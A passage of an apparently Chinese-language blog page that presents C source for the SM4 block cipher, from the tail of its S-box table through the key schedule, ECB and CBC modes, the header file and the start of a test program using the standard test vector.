class="number">0x34</span>, <span class="number">0x1a</span>, <span class="number">0x55</span>, <span class="number">0xad</span>, <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xf5</span>, <span class="number">0x8c</span>, <span class="number">0xb1</span>, <span class="number">0xe3</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x1d</span>, <span class="number">0xf6</span>, <span class="number">0xe2</span>, <span class="number">0x2e</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xca</span>, <span class="number">0x60</span>, <span class="number">0xc0</span>, <span class="number">0x29</span>, <span class="number">0x23</span>, <span class="number">0xab</span>, <span class="number">0x0d</span>, <span class="number">0x53</span>, <span class="number">0x4e</span>, <span class="number">0x6f</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0xd5</span>, <span class="number">0xdb</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xde</span>, <span class="number">0xfd</span>, <span class="number">0x8e</span>, <span class="number">0x2f</span>, <span class="number">0x03</span>, <span class="number">0xff</span>, <span class="number">0x6a</span>, <span class="number">0x72</span>, <span class="number">0x6d</span>, <span class="number">0x6c</span>, <span class="number">0x5b</span>, <span class="number">0x51</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x8d</span>, <span class="number">0x1b</span>, <span class="number">0xaf</span>, <span class="number">0x92</span>, <span class="number">0xbb</span>, <span class="number">0xdd</span>, <span class="number">0xbc</span>, <span class="number">0x7f</span>, <span class="number">0x11</span>, <span class="number">0xd9</span>, <span class="number">0x5c</span>, <span class="number">0x41</span>, <span class="number">0x1f</span>, <span class="number">0x10</span>, <span class="number">0x5a</span>, <span class="number">0xd8</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x0a</span>, <span class="number">0xc1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xa5</span>, <span class="number">0xcd</span>, <span class="number">0x7b</span>, <span class="number">0xbd</span>, <span class="number">0x2d</span>, <span class="number">0x74</span>, <span class="number">0xd0</span>, <span class="number">0x12</span>, <span class="number">0xb8</span>, <span class="number">0xe5</span>, <span class="number">0xb4</span>, <span class="number">0xb0</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4a</span>, <span class="number">0x0c</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7e</span>, <span class="number">0x65</span>, <span class="number">0xb9</span>, <span class="number">0xf1</span>, <span class="number">0x09</span>, <span class="number">0xc5</span>, <span class="number">0x6e</span>, <span class="number">0xc6</span>, <span class="number">0x84</span> &#125;,</span><br><span class="line">	&#123; <span class="number">0x18</span>, <span class="number">0xf0</span>, <span class="number">0x7d</span>, <span class="number">0xec</span>, <span class="number">0x3a</span>, <span class="number">0xdc</span>, <span class="number">0x4d</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xee</span>, <span class="number">0x5f</span>, <span class="number">0x3e</span>, <span class="number">0xd7</span>, <span class="number">0xcb</span>, <span class="number">0x39</span>, <span class="number">0x48</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* System parameter */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> FK[<span class="number">4</span>] = &#123; <span class="number">0xa3b1bac6</span>, <span class="number">0x56aa3350</span>, <span class="number">0x677d9197</span>, <span class="number">0xb27022dc</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* fixed parameter */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> CK[<span class="number">32</span>] =</span><br><span class="line">&#123;</span><br><span class="line">	<span class="number">0x00070e15</span>, <span class="number">0x1c232a31</span>, <span class="number">0x383f464d</span>, <span class="number">0x545b6269</span>,</span><br><span class="line">	<span class="number">0x70777e85</span>, <span class="number">0x8c939aa1</span>, <span class="number">0xa8afb6bd</span>, <span class="number">0xc4cbd2d9</span>,</span><br><span class="line">	<span class="number">0xe0e7eef5</span>, <span class="number">0xfc030a11</span>, <span class="number">0x181f262d</span>, <span class="number">0x343b4249</span>,</span><br><span class="line">	<span class="number">0x50575e65</span>, <span class="number">0x6c737a81</span>, <span class="number">0x888f969d</span>, <span class="number">0xa4abb2b9</span>,</span><br><span class="line">	<span class="number">0xc0c7ced5</span>, <span class="number">0xdce3eaf1</span>, <span class="number">0xf8ff060d</span>, <span class="number">0x141b2229</span>,</span><br><span class="line">	<span class="number">0x30373e45</span>, <span class="number">0x4c535a61</span>, <span class="number">0x686f767d</span>, <span class="number">0x848b9299</span>,</span><br><span class="line">	<span class="number">0xa0a7aeb5</span>, <span class="number">0xbcc3cad1</span>, <span class="number">0xd8dfe6ed</span>, <span class="number">0xf4fb0209</span>,</span><br><span class="line">	<span class="number">0x10171e25</span>, <span class="number">0x2c333a41</span>, <span class="number">0x484f565d</span>, <span class="number">0x646b7279</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* private function:</span></span><br><span class="line"><span class="comment">* look up in SboxTable and get the related value.</span></span><br><span class="line"><span class="comment">* args:    [in] inch: 0x00~0xFF (8 bits unsigned value).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="title">sm4Sbox</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> inch)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *pTable = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)SboxTable;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> retVal = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(pTable[inch]);</span><br><span class="line">	<span class="keyword">return</span> retVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* private F(Lt) function:</span></span><br><span class="line"><span class="comment">* "T algorithm" == "L algorithm" + "t algorithm".</span></span><br><span class="line"><span class="comment">* args:    [in] a: a is a 32 bits unsigned value;</span></span><br><span class="line"><span class="comment">* return: c: c is calculated with line algorithm "L" and nonline algorithm "t"</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">sm4Lt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> ka)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> bb = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> c = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">4</span>];</span><br><span class="line">	PUT_ULONG_BE(ka, a, <span class="number">0</span>)</span><br><span class="line">		b[<span class="number">0</span>] = sm4Sbox(a[<span class="number">0</span>]);</span><br><span class="line">	b[<span class="number">1</span>] = sm4Sbox(a[<span class="number">1</span>]);</span><br><span class="line">	b[<span class="number">2</span>] = sm4Sbox(a[<span class="number">2</span>]);</span><br><span class="line">	b[<span class="number">3</span>] = sm4Sbox(a[<span class="number">3</span>]);</span><br><span class="line">	GET_ULONG_BE(bb, b, <span class="number">0</span>)</span><br><span class="line">		c = bb ^ (ROTL(bb, <span class="number">2</span>)) ^ (ROTL(bb, <span class="number">10</span>)) ^ (ROTL(bb, <span class="number">18</span>)) ^ (ROTL(bb, <span class="number">24</span>));</span><br><span class="line">	<span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* private F function:</span></span><br><span class="line"><span class="comment">* Calculating and getting encryption/decryption contents.</span></span><br><span class="line"><span class="comment">* args:    [in] x0: original contents;</span></span><br><span class="line"><span class="comment">* args:    [in] x1: original contents;</span></span><br><span class="line"><span class="comment">* args:    [in] x2: original contents;</span></span><br><span class="line"><span class="comment">* args:    [in] x3: original contents;</span></span><br><span class="line"><span class="comment">* args:    [in] rk: encryption/decryption key;</span></span><br><span class="line"><span class="comment">* return the contents of encryption/decryption contents.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">sm4F</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> x0, <span class="keyword">unsigned</span> <span class="keyword">long</span> x1, <span class="keyword">unsigned</span> <span class="keyword">long</span> x2, <span class="keyword">unsigned</span> <span class="keyword">long</span> x3, <span class="keyword">unsigned</span> <span class="keyword">long</span> rk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (x0^sm4Lt(x1^x2^x3^rk));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* private function:</span></span><br><span class="line"><span class="comment">* Calculating round encryption key.</span></span><br><span class="line"><span class="comment">* args:    [in] a: a is a 32 bits unsigned value;</span></span><br><span class="line"><span class="comment">* return: sk[i]: i&#123;0,1,2,3,...31&#125;.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">sm4CalciRK</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> ka)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> bb = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> rk = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> a[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> b[<span class="number">4</span>];</span><br><span class="line">	PUT_ULONG_BE(ka, a, <span class="number">0</span>)</span><br><span class="line">		b[<span class="number">0</span>] = sm4Sbox(a[<span class="number">0</span>]);</span><br><span class="line">	b[<span class="number">1</span>] = sm4Sbox(a[<span class="number">1</span>]);</span><br><span class="line">	b[<span class="number">2</span>] = sm4Sbox(a[<span class="number">2</span>]);</span><br><span class="line">	b[<span class="number">3</span>] = sm4Sbox(a[<span class="number">3</span>]);</span><br><span class="line">	GET_ULONG_BE(bb, b, <span class="number">0</span>)</span><br><span class="line">		rk = bb ^ (ROTL(bb, <span class="number">13</span>)) ^ (ROTL(bb, <span class="number">23</span>));</span><br><span class="line">	<span class="keyword">return</span> rk;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sm4_setkey</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> SK[<span class="number">32</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> MK[<span class="number">4</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> k[<span class="number">36</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	GET_ULONG_BE(MK[<span class="number">0</span>], key, <span class="number">0</span>);</span><br><span class="line">	GET_ULONG_BE(MK[<span class="number">1</span>], key, <span class="number">4</span>);</span><br><span class="line">	GET_ULONG_BE(MK[<span class="number">2</span>], key, <span class="number">8</span>);</span><br><span class="line">	GET_ULONG_BE(MK[<span class="number">3</span>], key, <span class="number">12</span>);</span><br><span class="line">	k[<span class="number">0</span>] = MK[<span class="number">0</span>] ^ FK[<span class="number">0</span>];</span><br><span class="line">	k[<span class="number">1</span>] = MK[<span class="number">1</span>] ^ FK[<span class="number">1</span>];</span><br><span class="line">	k[<span class="number">2</span>] = MK[<span class="number">2</span>] ^ FK[<span class="number">2</span>];</span><br><span class="line">	k[<span class="number">3</span>] = MK[<span class="number">3</span>] ^ FK[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">for</span> (; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		k[i + <span class="number">4</span>] = k[i] ^ (sm4CalciRK(k[i + <span class="number">1</span>] ^ k[i + <span class="number">2</span>] ^ k[i + <span class="number">3</span>] ^ CK[i]));</span><br><span class="line">		SK[i] = k[i + <span class="number">4</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SM4 standard one round processing</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sm4_one_round</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> sk[<span class="number">32</span>],</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> input[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> output[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> ulbuf[<span class="number">36</span>];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(ulbuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(ulbuf));</span><br><span class="line">	GET_ULONG_BE(ulbuf[<span class="number">0</span>], input, <span class="number">0</span>)</span><br><span class="line">		GET_ULONG_BE(ulbuf[<span class="number">1</span>], input, <span class="number">4</span>)</span><br><span class="line">		GET_ULONG_BE(ulbuf[<span class="number">2</span>], input, <span class="number">8</span>)</span><br><span class="line">		GET_ULONG_BE(ulbuf[<span class="number">3</span>], input, <span class="number">12</span>)</span><br><span class="line">		<span class="keyword">while</span> (i&lt;<span class="number">32</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			ulbuf[i + <span class="number">4</span>] = sm4F(ulbuf[i], ulbuf[i + <span class="number">1</span>], ulbuf[i + <span class="number">2</span>], ulbuf[i + <span class="number">3</span>], sk[i]);</span><br><span class="line">			<span class="comment">// #ifdef _DEBUG</span></span><br><span class="line">			<span class="comment">//        	printf("rk(%02d) = 0x%08x,  X(%02d) = 0x%08x \n",i,sk[i], i, ulbuf[i+4] );</span></span><br><span class="line">			<span class="comment">// #endif</span></span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	PUT_ULONG_BE(ulbuf[<span class="number">35</span>], output, <span class="number">0</span>);</span><br><span class="line">	PUT_ULONG_BE(ulbuf[<span class="number">34</span>], output, <span class="number">4</span>);</span><br><span class="line">	PUT_ULONG_BE(ulbuf[<span class="number">33</span>], output, <span class="number">8</span>);</span><br><span class="line">	PUT_ULONG_BE(ulbuf[<span class="number">32</span>], output, <span class="number">12</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SM4 key schedule (128-bit, encryption)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sm4_setkey_enc</span><span class="params">(sm4_context *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ctx-&gt;mode = SM4_ENCRYPT;</span><br><span class="line">	sm4_setkey(ctx-&gt;sk, key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SM4 key schedule (128-bit, decryption)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sm4_setkey_dec</span><span class="params">(sm4_context *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	ctx-&gt;mode = SM4_ENCRYPT;</span><br><span class="line">	sm4_setkey(ctx-&gt;sk, key);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		SWAP(ctx-&gt;sk[i], ctx-&gt;sk[<span class="number">31</span> - i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SM4-ECB block encryption/decryption</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sm4_crypt_ecb</span><span class="params">(sm4_context *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *input,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (length &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		sm4_one_round(ctx-&gt;sk, input, output);</span><br><span class="line">		input += <span class="number">16</span>;</span><br><span class="line">		output += <span class="number">16</span>;</span><br><span class="line">		length -= <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* SM4-CBC buffer encryption/decryption</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sm4_crypt_cbc</span><span class="params">(sm4_context *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> iv[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *input,</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">unsigned</span> <span class="keyword">char</span> *output)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> temp[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mode == SM4_ENCRYPT)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (length &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">				output[i] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(input[i] ^ iv[i]);</span><br><span class="line"></span><br><span class="line">			sm4_one_round(ctx-&gt;sk, output, output);</span><br><span class="line">			<span class="built_in">memcpy</span>(iv, output, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">			input += <span class="number">16</span>;</span><br><span class="line">			output += <span class="number">16</span>;</span><br><span class="line">			length -= <span class="number">16</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="comment">/* SM4_DECRYPT */</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span> (length &gt; <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">memcpy</span>(temp, input, <span class="number">16</span>);</span><br><span class="line">			sm4_one_round(ctx-&gt;sk, input, output);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">				output[i] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(output[i] ^ iv[i]);</span><br><span class="line"></span><br><span class="line">			<span class="built_in">memcpy</span>(iv, temp, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">			input += <span class="number">16</span>;</span><br><span class="line">			output += <span class="number">16</span>;</span><br><span class="line">			length -= <span class="number">16</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sm4.h头文件，mode选择加密模式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* \file sm4.h</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> XYSSL_SM4_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XYSSL_SM4_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SM4_ENCRYPT     1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SM4_DECRYPT     0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* \brief          SM4 context structure</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> mode;                   <span class="comment">/*!&lt;  encrypt/decrypt   */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> sk[<span class="number">32</span>];       <span class="comment">/*!&lt;  SM4 subkeys       */</span></span><br><span class="line">&#125;</span><br><span class="line">sm4_context;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* \brief          SM4 key schedule (128-bit, encryption)</span></span><br><span class="line"><span class="comment">	*</span></span><br><span class="line"><span class="comment">	* \param ctx      SM4 context to be initialized</span></span><br><span class="line"><span class="comment">	* \param key      16-byte secret key</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">sm4_setkey_enc</span><span class="params">(sm4_context *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* \brief          SM4 key schedule (128-bit, decryption)</span></span><br><span class="line"><span class="comment">	*</span></span><br><span class="line"><span class="comment">	* \param ctx      SM4 context to be initialized</span></span><br><span class="line"><span class="comment">	* \param key      16-byte secret key</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">sm4_setkey_dec</span><span class="params">(sm4_context *ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>])</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* \brief          SM4-ECB block encryption/decryption</span></span><br><span class="line"><span class="comment">	* \param ctx      SM4 context</span></span><br><span class="line"><span class="comment">	* \param mode     SM4_ENCRYPT or SM4_DECRYPT</span></span><br><span class="line"><span class="comment">	* \param length   length of the input data</span></span><br><span class="line"><span class="comment">	* \param input    input block</span></span><br><span class="line"><span class="comment">	* \param output   output block</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">sm4_crypt_ecb</span><span class="params">(sm4_context *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *input,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *output)</span></span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* \brief          SM4-CBC buffer encryption/decryption</span></span><br><span class="line"><span class="comment">	* \param ctx      SM4 context</span></span><br><span class="line"><span class="comment">	* \param mode     SM4_ENCRYPT or SM4_DECRYPT</span></span><br><span class="line"><span class="comment">	* \param length   length of the input data</span></span><br><span class="line"><span class="comment">	* \param iv       initialization vector (updated after use)</span></span><br><span class="line"><span class="comment">	* \param input    buffer holding the input data</span></span><br><span class="line"><span class="comment">	* \param output   buffer holding the output data</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">sm4_crypt_cbc</span><span class="params">(sm4_context *ctx,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> mode,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">int</span> length,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">char</span> iv[<span class="number">16</span>],</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *input,</span></span></span><br><span class="line"><span class="function"><span class="params">		<span class="keyword">unsigned</span> <span class="keyword">char</span> *output)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* sm4.h */</span></span></span><br></pre></td></tr></table></figure>
<p>测试代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"sm4.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> key[<span class="number">16</span>] = &#123; <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xab</span>, <span class="number">0xcd</span>, <span class="number">0xef</span>, <span class="number">0xfe</span>, <span class="number">0xdc</span>, <span class="number">0xba</span>, <span class="number">0x98</span>, <span class="number">0x76</span>, <span class="number">0x54</span>, <span class="number">0x32</span>, <span class="number">0x10</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> input[<span class="number">16</span>] = &#123; <span class="number">0x01</span>, <span class="number">0x23</span>, <span class="number">0x45</span>, <span class="number">0x67</span>, <span class="number">0x89</span>, <span class="number">0xab</span>, <span class="number">0xcd</span>, <span class="number">0xef</span>, <span class="number">0xfe</span>, <span class="number">0xdc</span>, <span class="number">0xba</span>, <span class="number">0x98</span>, <span class="number">0x76</span>, <span class="number">0x54</span>, <span class="number">0x32</span>, <span class="number">0x10</span> &#125;;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> output[<span class="number">16</span>];</span><br><span class="line">	sm4_context ctx;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//encrypt standard testing vector</span></span><br><span class="line">	sm4_setkey_enc(&amp;ctx, key);</span><br><span class="line">	sm4_crypt_ecb(&amp;ctx, <span class="number">1</span>, <span class="number">16</span>, input, output);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">16</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%02x "</span>, output[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//解密测试</span></span><br><span class="line">	sm4_setkey_dec(&amp;ctx, key);</span><br><span class="line">	sm4_crypt_ecb(&amp;ctx, <span class="number">0</span>, <span class="number">16</span>, output, output);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i&lt;<span class="number">16</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%02x "</span>, output[i]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//decrypt 1M times testing vector based on standards.</span></span><br><span class="line">	i = <span class="number">0</span>;</span><br><span class="line">	sm4_setkey_enc(&amp;ctx, 